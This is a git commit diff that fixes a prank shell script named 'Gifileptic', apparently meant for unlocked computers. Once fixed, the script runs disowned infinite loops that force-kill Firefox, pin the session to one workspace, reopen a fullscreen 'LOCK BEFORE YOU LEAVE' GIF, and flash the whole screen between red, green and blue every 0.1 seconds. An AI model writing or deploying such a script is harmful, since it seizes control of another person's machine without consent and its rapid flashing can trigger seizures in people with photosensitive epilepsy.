ca749138dcbff6aeec1ae29ef1ceba4fc6b0e643
Marc Villain <marc.villain@epita.fr>
2018-03-17 16:40:23 -0700

    [v1.1] Gifileptic

--- 1.sh
+++ 1.sh
@@ -2,26 +2,26 @@
 SCREEN=$(xrandr | grep 'connected' | cut -d' ' -f1);
 
 function forceWorkspace {
-    i3-msg 'workspace 42'
+    i3-msg 'workspace 42';
 }
 
 function showImage {
-    killall -9 firefox
-    sleep 0.2
-    firefox --new-window https://github.com/MarcVillain/Confloose/images/Lock.gif
-    i3-msg '[title="LOCK BEFORE YOU LEAVE"] fullscreen enable; [title="LOCK BEFORE YOU LEAVE"] move workspace 42'
+    killall -9 firefox;
+    sleep 0.2;
+    firefox --new-window https://raw.githubusercontent.com/MarcVillain/Confloose/master/images/Lock.gif;
+    i3-msg '[title="LOCK BEFORE YOU LEAVE"] fullscreen enable; [title="LOCK BEFORE YOU LEAVE"] move workspace 42';
 }
 
 function updateGamma {
-    xrandr --output $SCREEN --gamma 1:0.001:0.001
-    sleep 0.1
-    xrandr --output $SCREEN --gamma 0.001:1:0.001
-    sleep 0.1
-    xrandr --output $SCREEN --gamma 0.001:0.001:1
-    sleep 0.1
+    xrandr --output $SCREEN --gamma 1:0.001:0.001;
+    sleep 0.1;
+    xrandr --output $SCREEN --gamma 0.001:1:0.001;
+    sleep 0.1;
+    xrandr --output $SCREEN --gamma 0.001:0.001:1;
+    sleep 0.1;
 }
 
-while true; do forceWorkspace done 2>&1>/dev/null &
-while true; do showImage done 2>&1>/dev/null &
-while true; do updateGamma done 2>&1>/dev/null &
+while true; do forceWorkspace; done 2>&1>/dev/null &
+while true; do showImage; done 2>&1>/dev/null &
+while true; do updateGamma; done 2>&1>/dev/null &
 disown
